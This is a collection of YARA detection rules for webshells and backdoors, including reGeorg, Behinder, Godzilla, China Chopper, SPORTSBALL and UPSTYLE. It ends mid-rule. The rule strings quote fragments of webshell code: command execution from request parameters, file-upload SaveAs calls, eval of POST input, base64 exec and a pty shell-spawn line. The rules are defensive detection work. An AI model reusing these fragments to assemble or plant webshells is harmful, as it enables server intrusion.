import "math"
import "pe"
rule ELASTIC_Linux_Webshell_Generic_E80Ff633 : FILE MEMORY {
    meta:
		description = "Detects Linux Webshell Generic (Linux.Webshell.Generic)"
		author = "Elastic Security"
		id = "e80ff633-990e-4e2e-ac80-2e61685ab8b0"
		date = "2021-01-12"
		modified = "2021-09-16"
		reference = "https://github.com/elastic/protections-artifacts/"
		source_url = "https://github.com/elastic/protections-artifacts//blob/99e762c867d944ed7a8ddf83f6af9475442f5c19/yara/rules/Linux_Webshell_Generic.yar#L1-L19"
		license_url = "https://github.com/elastic/protections-artifacts//blob/99e762c867d944ed7a8ddf83f6af9475442f5c19/LICENSE.txt"
		hash = "7640ba6f2417931ef901044152d5bfe1b266219d13b5983d92ddbdf644de5818"
		logic_hash = "d345e6ce3e51ed55064aafb1709e9bee7ef2ce87ec80165ac1b58eebd83cefee"
		score = 75
		quality = 75
		tags = "FILE, MEMORY"
		fingerprint = "dcca52dce2d50b0aa6cf0132348ce9dc234b985ae683b896d9971d409f109849"
		severity = 100
		arch_context = "x86"
		scan_context = "file, memory"
		license = "Elastic License v2"
		os = "linux"

	strings:
		$a = { 24 A8 00 00 00 89 1C 24 83 3C 24 00 74 23 83 04 24 24 8D B4 24 AC 00 }

	condition:
		all of them
}
rule ELASTIC_Linux_Webshell_Generic_41A5Fa40 : FILE MEMORY {
    meta:
		description = "Detects Linux Webshell Generic (Linux.Webshell.Generic)"
		author = "Elastic Security"
		id = "41a5fa40-a4e7-4c97-a3b9-3700743265df"
		date = "2021-06-28"
		modified = "2021-09-16"
		reference = "18ac7fbc3d8d3bb8581139a20a7fee8ea5b7fcfea4a9373e3d22c71bae3c9de0"
		source_url = "https://github.com/elastic/protections-artifacts//blob/99e762c867d944ed7a8ddf83f6af9475442f5c19/yara/rules/Linux_Webshell_Generic.yar#L21-L39"
		license_url = "https://github.com/elastic/protections-artifacts//blob/99e762c867d944ed7a8ddf83f6af9475442f5c19/LICENSE.txt"
		logic_hash = "574148bc58626aac00add1989c65ad56315c7e2a8d27c7b96be404d831a7a576"
		score = 75
		quality = 73
		tags = "FILE, MEMORY"
		fingerprint = "49e0d55579453ec37c6757ddb16143d8e86ad7c7c4634487a1bd2215cd22df83"
		severity = "100"
		arch_context = "x86"
		scan_context = "file, memory"
		license = "Elastic License v2"
		os = "linux"

	strings:
		$a = { 5A 46 55 6C 73 6E 55 6B 56 52 56 55 56 54 56 46 39 56 55 6B 6B }

	condition:
		all of them
}
rule ELASTIC_Windows_Trojan_Behinder_B9A49F4B : FILE MEMORY {
    meta:
		description = "Webshell found in REF2924, either Behinder or Godzilla based shell in C#"
		author = "Elastic Security"
		id = "b9a49f4b-5923-420e-a9e6-9bfa05c93bbf"
		date = "2023-03-02"
		modified = "2023-06-13"
		reference = "https://www.elastic.co/security-labs/ref2924-howto-maintain-persistence-as-an-advanced-threat"
		source_url = "https://github.com/elastic/protections-artifacts//blob/99e762c867d944ed7a8ddf83f6af9475442f5c19/yara/rules/Windows_Trojan_Behinder.yar#L1-L22"
		license_url = "https://github.com/elastic/protections-artifacts//blob/99e762c867d944ed7a8ddf83f6af9475442f5c19/LICENSE.txt"
		hash = "a50ca8df4181918fe0636272f31e19815f1b97cce6d871e15e03b0ee0e3da17b"
		logic_hash = "2303ef82e4dc5e8be87ddc4563dcd06963d17e1fbf25cf246a6c81e4e74adbcb"
		score = 75
		quality = 73
		tags = "FILE, MEMORY"
		fingerprint = "cb7856a7d3e792cc60837587fe4afc04448af74cb5ce0478a09eb129e53bf7f1"
		threat_name = "Windows.Trojan.Behinder"
		severity = 100
		arch_context = "x86"
		scan_context = "file, memory"
		license = "Elastic License v2"
		os = "windows"

	strings:
		$load = { 53 79 73 74 65 6D 2E 52 65 66 6C 65 63 74 69 6F 6E 2E 41 73 73 65 6D 62 6C 79 }
		$key = "e45e329feb5d925b" ascii wide

	condition:
		all of them
}
rule ARKBIRD_SOLG_APT_UNC2452_Webshell_Chopper_Mar_2021_1 : FILE {
    meta:
		description = "Detect exploit listener in the exchange configuration for Webshell Chopper used by UNC2452 group"
		author = "Arkbird_SOLG"
		id = "174af8e1-0df0-5ad7-ac7d-a208f64cb765"
		date = "2021-03-07"
		modified = "2021-03-07"
		reference = "Internal Research"
		source_url = "https://github.com/StrangerealIntel/DailyIOC/blob/a873ff1298c43705e9c67286f3014f4300dd04f7/2021-03-07/UNC2452/APT_UNC2452_Webshell_Chopper_Mar_2021_1.yar#L1-L26"
		license_url = "N/A"
		logic_hash = "77bd7e5c10aa9cf2b407b37a76954b4eed163e36653e1fb3cde5de853f824cf0"
		score = 75
		quality = 73
		tags = "FILE"

	strings:
		$l1 = { 20 68 74 74 70 3a 2f 2f ?? 2f 3c 73 63 72 69 70 74 20 4c 61 6e 67 75 61 67 65 3d 22 63 23 22 20 72 75 6e 61 74 3d 22 73 65 72 76 65 72 22 3e 76 6f 69 64 20 50 61 67 65 5f 4c 6f 61 64 28 6f 62 6a 65 63 74 20 73 65 6e 64 65 72 2c 20 45 76 65 6e 74 41 72 67 73 20 65 29 7b 69 66 20 28 52 65 71 75 65 73 74 2e 46 69 6c 65 73 2e 43 6f 75 6e 74 21 3d 30 29 20 7b 20 52 65 71 75 65 73 74 2e 46 69 6c 65 73 5b 30 5d 2e 53 61 76 65 41 73 28 53 65 72 76 65 72 2e 4d 61 70 50 61 74 68 28 22 [5-14] 22 29 29 3b 7d 7d 3c 2f 73 63 72 69 70 74 3e }
		$l2 = { 68 74 74 70 3a 2f 2f ?? 2f 73 63 72 69 70 74 20 6c 61 6e 67 75 61 67 65 3d 22 4a 53 63 72 69 70 74 22 20 72 75 6e 61 74 3d 22 73 65 72 76 65 72 22 3e 66 75 6e 63 74 69 6f 6e 20 50 61 67 65 5f 4c 6f 61 64 28 29 7b 65 76 61 6c 28 [-] 2c 22 75 6e 73 61 66 65 22 29 3b 7d 3c 2f 73 63 72 69 70 74 3e }
		$c1 = { 5c 4f 41 42 20 28 44 65 66 61 75 6c 74 20 57 65 62 20 53 69 74 65 29 }
		$c2 = "ExternalUrl" fullword ascii
		$c3 = { 49 49 53 3a 2f 2f [10-30] 2f 57 33 53 56 43 2f [1-3] 2f 52 4f 4f 54 2f 4f 41 42 }
		$c4 = "FrontEnd\\HttpProxy\\OAB" fullword ascii
		$c5 = "/Configuration/Schema/ms-Exch-OAB-Virtual-Directory" fullword ascii

	condition:
		filesize >1KB and 1 of ($l*) and 3 of ($c*)
}
rule VOLEXITY_Apt_Malware_Py_Upstyle : UTA0218 FILE MEMORY {
    meta:
		description = "Detect the UPSTYLE webshell."
		author = "threatintel@volexity.com"
		id = "45726f35-8b3e-5095-b145-9e7f6da6838b"
		date = "2024-04-11"
		modified = "2024-04-12"
		reference = "TIB-20240412"
		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2024/2024-04-12 Palo Alto Networks GlobalProtect/indicators/rules.yar#L1-L33"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		logic_hash = "51923600b23d23f4ce29eac7f5ab9f7e1ddb45bed5f6727ddec4dcb75872e473"
		score = 75
		quality = 80
		tags = "UTA0218, FILE, MEMORY"
		hash1 = "3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac"
		hash2 = "0d59d7bddac6c22230187ef6cf7fa22bca93759edc6f9127c41dc28a2cea19d8"
		hash3 = "4dd4bd027f060f325bf6a90d01bfcf4e7751a3775ad0246beacc6eb2bad5ec6f"
		os = "linux"
		os_arch = "all"
		scan_context = "file,memory"
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"
		rule_id = 10429
		version = 2

	strings:
		$stage1_str1 = "/opt/pancfg/mgmt/licenses/PA_VM"
		$stage1_str2 = "exec(base64."
		$stage2_str1 = "signal.signal(signal.SIGTERM,stop)"
		$stage2_str2 = "exec(base64."
		$stage3_str1 = "write(\"/*\"+output+\"*/\")"
		$stage3_str2 = "SHELL_PATTERN"

	condition:
		all of ($stage1*) or all of ($stage2*) or all of ($stage3*)
}
rule VOLEXITY_Apt_Webshell_Pl_Complyshell : UTA0178 FILE MEMORY {
    meta:
		description = "Detection for the COMPLYSHELL webshell."
		author = "threatintel@volexity.com"
		id = "6b44b5bc-a75f-573c-b9c3-562b7874e408"
		date = "2023-12-13"
		modified = "2024-01-09"
		reference = "TIB-20231215"
		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2024/2024-01-10 Ivanti Connect Secure/indicators/yara.yar#L1-L22"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		logic_hash = "ff46691f1add20cff30fe996e2fb199ce42408e86d5642a8a43c430f2245b1f5"
		score = 75
		quality = 80
		tags = "UTA0178, FILE, MEMORY"
		hash1 = "8bc8f4da98ee05c9d403d2cb76097818de0b524d90bea8ed846615e42cb031d2"
		os = "linux"
		os_arch = "all"
		scan_context = "file,memory"
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"
		rule_id = 9995
		version = 4

	strings:
		$s = "eval{my $c=Crypt::RC4->new("

	condition:
		$s
}
rule VOLEXITY_Apt_Webshell_Aspx_Glasstoken : UTA0178 FILE MEMORY {
    meta:
		description = "Detection for a custom webshell seen on external facing server. The webshell contains two functions, the first is to act as a Tunnel, using code borrowed from reGeorg, the second is custom code to execute arbitrary .NET code."
		author = "threatintel@volexity.com"
		id = "5d96294c-aa61-5752-ab06-d5b27f6ac3a1"
		date = "2023-12-12"
		modified = "2024-01-09"
		reference = "TIB-20231215"
		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2024/2024-01-10 Ivanti Connect Secure/indicators/yara.yar#L24-L49"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		logic_hash = "34844dc2ba4b18b25dcb5b14b7b80ec655595c9638600a0f2a6367610c542dd1"
		score = 75
		quality = 80
		tags = "UTA0178, FILE, MEMORY"
		hash1 = "26cbb54b1feb75fe008e36285334d747428f80aacdb57badf294e597f3e9430d"
		os = "win"
		os_arch = "all"
		scan_context = "file,memory"
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"
		rule_id = 9994
		version = 5

	strings:
		$s1 = "=Convert.FromBase64String(System.Text.Encoding.Default.GetString(" ascii
		$re = /Assembly\.Load\(errors\)\.CreateInstance\("[a-z0-9A-Z]{4,12}"\).GetHashCode\(\);/

	condition:
		for any i in (0..#s1) : ($re in (@s1[i]..@s1[i]+512))
}
rule VOLEXITY_Webshell_Aspx_Regeorg : FILE MEMORY {
    meta:
		description = "Detects the reGeorg webshell based on common strings in the webshell. May also detect other webshells which borrow code from ReGeorg."
		author = "threatintel@volexity.com"
		id = "02365a30-769e-5c47-8d36-a79608ffd121"
		date = "2018-08-29"
		modified = "2024-01-09"
		reference = "TIB-20231215"
		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2024/2024-01-10 Ivanti Connect Secure/indicators/yara.yar#L51-L83"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		hash = "9d901f1a494ffa98d967ee6ee30a46402c12a807ce425d5f51252eb69941d988"
		logic_hash = "4fed023e85a32052917f6db1e2e155c91586538938c03acc59f200a8264888ca"
		score = 75
		quality = 80
		tags = "FILE, MEMORY"
		os = "win"
		os_arch = "all"
		scan_context = "file,memory"
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"
		rule_id = 410
		version = 7

	strings:
		$a1 = "every office needs a tool like Georg" ascii
		$a2 = "cmd = Request.QueryString.Get(\"cmd\")" ascii
		$a3 = "exKak.Message" ascii
		$proxy1 = "if (rkey != \"Content-Length\" && rkey != \"Transfer-Encoding\")"
		$proxy_b1 = "StreamReader repBody = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(\"UTF-8\"));" ascii
		$proxy_b2 = "string rbody = repBody.ReadToEnd();" ascii
		$proxy_b3 = "Response.AddHeader(\"Content-Length\", rbody.Length.ToString());" ascii

	condition:
		any of ($a*) or $proxy1 or all of ($proxy_b*)
}
rule VOLEXITY_Webshell_Aspx_Simpleseesharp : WEBSHELL UNCLASSIFIED FILE {
    meta:
		description = "A simple ASPX Webshell that allows an attacker to write further files to disk."
		author = "threatintel@volexity.com"
		id = "469fdf5c-e09e-5d44-a2e6-0864dcd0e18a"
		date = "2021-03-01"
		modified = "2021-09-01"
		reference = "https://github.com/volexity/threat-intel"
		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2021/2021-03-02 - Operation Exchange Marauder/indicators/yara.yar#L1-L19"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		hash = "893cd3583b49cb706b3e55ecb2ed0757b977a21f5c72e041392d1256f31166e2"
		logic_hash = "6f62249a68bae94e5cbdb4319ea5cde9dc071ec7a4760df3aafe78bc1e072c30"
		score = 75
		quality = 80
		tags = "WEBSHELL, UNCLASSIFIED, FILE"
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"

	strings:
		$header = "<%@ Page Language=\"C#\" %>"
		$body = "<% HttpPostedFile thisFile = Request.Files[0];thisFile.SaveAs(Path.Combine"

	condition:
		$header at 0 and $body and filesize <1KB
}
rule VOLEXITY_Webshell_Aspx_Regeorgtunnel : WEBSHELL COMMODITY {
    meta:
		description = "variation on reGeorgtunnel"
		author = "threatintel@volexity.com"
		id = "b8aa27c9-a28a-5051-8f81-1184f28842ed"
		date = "2021-03-01"
		modified = "2021-09-01"
		reference = "https://github.com/sensepost/reGeorg/blob/master/tunnel.aspx"
		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2021/2021-03-02 - Operation Exchange Marauder/indicators/yara.yar#L21-L43"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		hash = "406b680edc9a1bb0e2c7c451c56904857848b5f15570401450b73b232ff38928"
		logic_hash = "ea3d0532cb609682922469e8272dc8061efca3b3ae27df738ef2646e30404c6f"
		score = 75
		quality = 80
		tags = "WEBSHELL, COMMODITY"
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"

	strings:
		$s1 = "System.Net.Sockets"
		$s2 = "System.Text.Encoding.Default.GetString(Convert.FromBase64String(StrTr(Request.Headers.Get"
		$t1 = ".Split('|')"
		$t2 = "Request.Headers.Get"
		$t3 = ".Substring("
		$t4 = "new Socket("
		$t5 = "IPAddress ip;"

	condition:
		all of ($s*) or all of ($t*)
}
rule VOLEXITY_Webshell_Aspx_Sportsball : WEBSHELL {
    meta:
		description = "The SPORTSBALL webshell allows attackers to upload files or execute commands on the system."
		author = "threatintel@volexity.com"
		id = "d8cf1eb7-c08b-5c3c-b7d8-135b15418a7d"
		date = "2021-03-01"
		modified = "2021-09-01"
		reference = "https://github.com/volexity/threat-intel"
		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2021/2021-03-02 - Operation Exchange Marauder/indicators/yara.yar#L45-L68"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		hash = "2fa06333188795110bba14a482020699a96f76fb1ceb80cbfa2df9d3008b5b0a"
		logic_hash = "4f90d727db91a93f53d08d2134f57bd03e7e2367aec3d78d275cfd192d7fb928"
		score = 75
		quality = 80
		tags = "WEBSHELL"
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"

	strings:
		$uniq1 = "HttpCookie newcook = new HttpCookie(\"fqrspt\", HttpContext.Current.Request.Form"
		$uniq2 = "ZN2aDAB4rXsszEvCLrzgcvQ4oi5J1TuiRULlQbYwldE="
		$var1 = "Result.InnerText = string.Empty;"
		$var2 = "newcook.Expires = DateTime.Now.AddDays("
		$var3 = "System.Diagnostics.Process process = new System.Diagnostics.Process()"
		$var4 = "process.StandardInput.WriteLine(HttpContext.Current.Request.Form[\""
		$var5 = "else if (!string.IsNullOrEmpty(HttpContext.Current.Request.Form[\""
		$var6 = "<input type=\"submit\" value=\"Upload\" />"

	condition:
		any of ($uniq*) or all of ($var*)
}
rule VOLEXITY_Trojan_Win_Iis_Shellsave : XEGROUP {
    meta:
		description = "Detects an AutoIT backdoor designed to run on IIS servers and to install a webshell. This rule will only work against memory samples."
		author = "threatintel@volexity.com"
		id = "a89defa5-4b22-5650-a0c0-f4b3cf3377a7"
		date = "2021-11-17"
		modified = "2021-12-07"
		reference = "https://github.com/volexity/threat-intel"
		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2021/2021-12-06 - XEGroup/indicators/yara.yar#L22-L40"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		logic_hash = "f34d6f4ecaa4cde5965f6b0deac55c7133a2be96f5c466f34775be6e7f730493"
		score = 75
		quality = 80
		tags = "XEGROUP"
		hash1 = "21683e02e11c166d0cf616ff9a1a4405598db7f4adfc87b205082ae94f83c742"
		memory_suitable = 1
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"

	strings:
		$s1 = "getdownloadshell" ascii
		$s2 = "deleteisme" ascii
		$s3 = "sitepapplication" ascii
		$s4 = "getapplicationpool" ascii

	condition:
		all of them
}
rule VOLEXITY_Webshell_Jsp_Converge : WEBSHELL {
    meta:
		description = "File upload webshell observed in incident involving compromise of Confluence server."
		author = "threatintel@volexity.com"
		id = "2a74678e-cb00-567c-a2e0-2e095f3e5ee8"
		date = "2022-06-01"
		modified = "2022-06-06"
		reference = "https://github.com/volexity/threat-intel"
		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2022/2022-06-02 Active Exploitation Of Confluence 0-day/indicators/yara.yar#L1-L15"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		logic_hash = "bb48516342eddd48c35e6db0eb74f95e116dc723503552b99ba721b5bdb391e5"
		score = 75
		quality = 80
		tags = "WEBSHELL"
		memory_suitable = 1
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"

	strings:
		$s1 = "if (request.getParameter(\"name\")!=null && request.getParameter(\"name\").length()!=0){" ascii

	condition:
		$s1
}
rule VOLEXITY_General_Jsp_Possible_Tiny_Fileuploader : GENERAL WEBSHELLS FILE {
    meta:
		description = "Detects small .jsp files which have possible file upload utility."
		author = "threatintel@volexity.com"
		id = "d111aab3-af6e-59cb-a445-ebd4a454fb9a"
		date = "2022-06-01"
		modified = "2022-06-06"
		reference = "https://github.com/volexity/threat-intel"
		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2022/2022-06-02 Active Exploitation Of Confluence 0-day/indicators/yara.yar#L17-L50"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		logic_hash = "bad62e6fd33ffb0d8551302fd7f85528066992c272b670d44a33b5b2eb174886"
		score = 75
		quality = 80
		tags = "GENERAL, WEBSHELLS, FILE"
		hash1 = "4addb9bc9e5e1af8fda63589f6b3fc038ccfd651230fa3fa61814ad080e95a12"
		memory_suitable = 0
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"

	strings:
		$required1 = "request." ascii
		$required2 = "java.io.FileOutputStream" ascii
		$required3 = ".write" ascii
		$encoding1 = "java.util.Base64" ascii
		$encoding2 = "crypto.Cipher" ascii
		$encoding3 = ".misc.BASE64Decoder" ascii

	condition:
		( filesize <4KB and all of ($required*) and any of ($encoding*)) or ( filesize <600 and all of ($required*))
}
rule VOLEXITY_Webshell_Java_Realcmd : COMMODITY WEBSHELLS {
    meta:
		description = "Detects the RealCMD webshell, one of the payloads for BEHINDER."
		author = "threatintel@volexity.com"
		id = "d5e7e3c8-a0aa-5c2e-8a2d-654e066593eb"
		date = "2022-06-01"
		modified = "2022-06-06"
		reference = "https://github.com/Freakboy/Behinder/blob/master/src/main/java/vip/youwe/sheller/payload/java/RealCMD.java"
		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2022/2022-06-02 Active Exploitation Of Confluence 0-day/indicators/yara.yar#L52-L79"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		logic_hash = "244add844570b23e5df23882a3fdacf894f3e201b01373d949b0752361960536"
		score = 75
		quality = 80
		tags = "COMMODITY, WEBSHELLS"
		hash1 = "a9a30455d6f3a0a8cd0274ae954aa41674b6fd52877fafc84a9cb833fd8858f6"
		memory_suitable = 1
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"

	strings:
		$fn1 = "runCmd" wide ascii fullword
		$fn2 = "RealCMD" ascii wide fullword
		$fn3 = "buildJson" ascii wide fullword
		$fn4 = "Encrypt" ascii wide fullword
		$s1 = "AES/ECB/PKCS5Padding" ascii wide
		$s2 = "python -c 'import pty; pty.spawn" ascii wide
		$s3 = "status" ascii wide
		$s4 = "success" ascii wide
		$s5 = "sun.jnu.encoding" ascii wide
		$s6 = "java.util.Base64" ascii wide

	condition:
		all of ($fn*) or all of ($s*)
}
rule VOLEXITY_Webshell_Java_Behinder_Shellservice : WEBSHELLS COMMODITY {
    meta:
		description = "Looks for artifacts generated (generally seen in .class files) related to the Behinder framework."
		author = "threatintel@volexity.com"
		id = "21c1e3e9-d048-5c60-9c21-8e54b27f359a"
		date = "2022-03-18"
		modified = "2022-07-28"
		reference = "https://github.com/MountCloud/BehinderClientSource/blob/master/src/main/java/net/rebeyond/behinder/core/ShellService.java"
		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2022/2022-06-15 DriftingCloud - Zero-Day Sophos Firewall Exploitation and an Insidious Breach/indicators/yara.yar#L1-L23"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		logic_hash = "373a8d4ef81e9bbbf1f24ebf0389e7da4b73f88786cc8e1d286ccc9f4c36debc"
		score = 75
		quality = 30
		tags = "WEBSHELLS, COMMODITY"
		hash1 = "9a9882f9082a506ed0fc4ddaedd50570c5762deadcaf789ac81ecdbb8cf6eff2"
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"
		memory_suitable = 1

	strings:
		$s1 = "CONNECT" ascii fullword
		$s2 = "DISCONNECT" ascii fullword
		$s3 = "socket_" ascii fullword
		$s4 = "targetIP" ascii fullword
		$s5 = "targetPort" ascii fullword
		$s6 = "socketHash" ascii fullword
		$s7 = "extraData" ascii fullword

	condition:
		all of them
}
rule VOLEXITY_General_Java_Encoding_And_Classloader : WEBSHELLS GENERAL FILE {
    meta:
		description = "Identifies suspicious java-based files which have all the ingredients required for a webshell."
		author = "threatintel@volexity.com"
		id = "7de5449d-de70-5153-b1b1-8a995ac8b7a0"
		date = "2022-04-07"
		modified = "2022-07-28"
		reference = "https://github.com/volexity/threat-intel"
		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2022/2022-06-15 DriftingCloud - Zero-Day Sophos Firewall Exploitation and an Insidious Breach/indicators/yara.yar#L25-L43"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		logic_hash = "21c226b03451eb98a8be5b26a9f00169f16454ecd21d4131c9991b63d2e3c8cd"
		score = 65
		quality = 80
		tags = "WEBSHELLS, GENERAL, FILE"
		hash1 = "0d5dc54ef77bc18c4c5582dca4619905605668cffcccc3829e43c6d3e14ef216"
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"
		memory_suitable = 0

	strings:
		$s1 = "javax.crypto.spec.SecretKeySpec" ascii
		$s2 = "java/security/SecureClassLoader" ascii
		$s3 = "sun.misc.BASE64Decoder" ascii

	condition:
		filesize <50KB and all of them
}
rule VOLEXITY_Webshell_Php_Str_Replace_Create_Func : WEBSHELLS GENERAL FILE {
    meta:
		description = "Looks for obfuscated PHP shells where create_function() is obfuscated using str_replace and then called using no arguments."
		author = "threatintel@volexity.com"
		id = "e0a5965c-54c3-5699-a45b-58f7152574dd"
		date = "2022-04-04"
		modified = "2022-07-28"
		reference = "https://github.com/volexity/threat-intel"
		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2022/2022-06-15 DriftingCloud - Zero-Day Sophos Firewall Exploitation and an Insidious Breach/indicators/yara.yar#L45-L73"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		logic_hash = "6a9ded1f1a8e4b8ae5f3db06f71bec6e9f62b6126b7444408d6319a35ed23827"
		score = 75
		quality = 80
		tags = "WEBSHELLS, GENERAL, FILE"
		hash1 = "c713d13af95f2fe823d219d1061ec83835bf0281240fba189f212e7da0d94937"
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"
		memory_suitable = 0

	strings:
		$php = "<?php"
		$s = "=str_replace(" ascii
		$anon_func = "(''," ascii

	condition:
		filesize <100KB and $php at 0 and for any i in (1..#s) : ( for any j in (1..#anon_func) : ( uint16be(@s[i]-2)== uint16be(@anon_func[j]-2)))
}
rule VOLEXITY_General_Php_Fileinput_Eval : WEBSHELLS GENERAL {
    meta:
		description = "Look for PHP files which use file_get_contents and then shortly afterwards use an eval statement."
		author = "threatintel@volexity.com"
		id = "c00d8fee-f667-5979-ad2a-dbb762544c2f"
		date = "2021-06-16"
		modified = "2022-07-28"
		reference = "https://github.com/volexity/threat-intel"
		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2022/2022-06-15 DriftingCloud - Zero-Day Sophos Firewall Exploitation and an Insidious Breach/indicators/yara.yar#L136-L152"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		logic_hash = "c61f0ee13007e398f45711354a1ca948f7f34893c9bcbdf845be932b63bd746d"
		score = 75
		quality = 80
		tags = "WEBSHELLS, GENERAL"
		hash1 = "1a34c43611ee310c16acc383c10a7b8b41578c19ee85716b14ac5adbf0a13bd5"
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"
		memory_suitable = 0

	strings:
		$s1 = "file_get_contents(\"php://input\");"
		$s2 = "eval("

	condition:
		$s2 in (@s1[1]..@s1[1]+512)
}
rule VOLEXITY_General_Php_Call_User_Func : GENERAL WEBSHELLS {
    meta:
		description = "Webshells using call_user_func against an object from a file input or POST variable."
		author = "threatintel@volexity.com"
		id = "48c7857e-7dda-5e3f-b82c-7d34c251f083"
		date = "2021-06-16"
		modified = "2022-07-28"
		reference = "https://zhuanlan.zhihu.com/p/354906657"
		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2022/2022-06-15 DriftingCloud - Zero-Day Sophos Firewall Exploitation and an Insidious Breach/indicators/yara.yar#L154-L170"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		logic_hash = "46c999da97682023861e58f9cd2c8651480db990a0361c1985c6d5c35b5bf0ea"
		score = 75
		quality = 80
		tags = "GENERAL, WEBSHELLS"
		hash1 = "40b053a2f3c8f47d252b960a9807b030b463ef793228b1670eda89f07b55b252"
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"
		memory_suitable = 0

	strings:
		$s1 = "@call_user_func(new C()" wide ascii

	condition:
		$s1
}
rule VOLEXITY_Webshell_Php_Icescorpion : COMMODITY WEBSHELL FILE {
    meta:
		description = "Detects the IceScorpion webshell."
		author = "threatintel@volexity.com"
		id = "dd165d67-375e-5d51-825a-45241345e268"
		date = "2022-01-17"
		modified = "2022-07-28"
		reference = "https://www.codenong.com/cs106064226/"
		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2022/2022-06-15 DriftingCloud - Zero-Day Sophos Firewall Exploitation and an Insidious Breach/indicators/yara.yar#L172-L190"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		logic_hash = "0c75ec7cbbfdba8ce5f71a83d78caf19366954b84f304c1864e68bbe11a9a2df"
		score = 75
		quality = 80
		tags = "COMMODITY, WEBSHELL, FILE"
		hash1 = "5af4788d1a61009361b37e8db65deecbfea595ef99c3cf920d33d9165b794972"
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"
		memory_suitable = 0

	strings:
		$s1 = "[$i+1&15];"
		$s2 = "openssl_decrypt"

	condition:
		all of them and filesize <10KB
}
rule VOLEXITY_Webshell_Jsp_Godzilla : WEBSHELLS COMMODITY {
    meta:
		description = "Detects the JSP implementation of the Godzilla Webshell."
		author = "threatintel@volexity.com"
		id = "47c8eab8-84d7-5566-b757-5a6dcc7579b7"
		date = "2021-11-08"
		modified = "2022-08-10"
		reference = "https://unit42.paloaltonetworks.com/manageengine-godzilla-nglite-kdcsponge/"
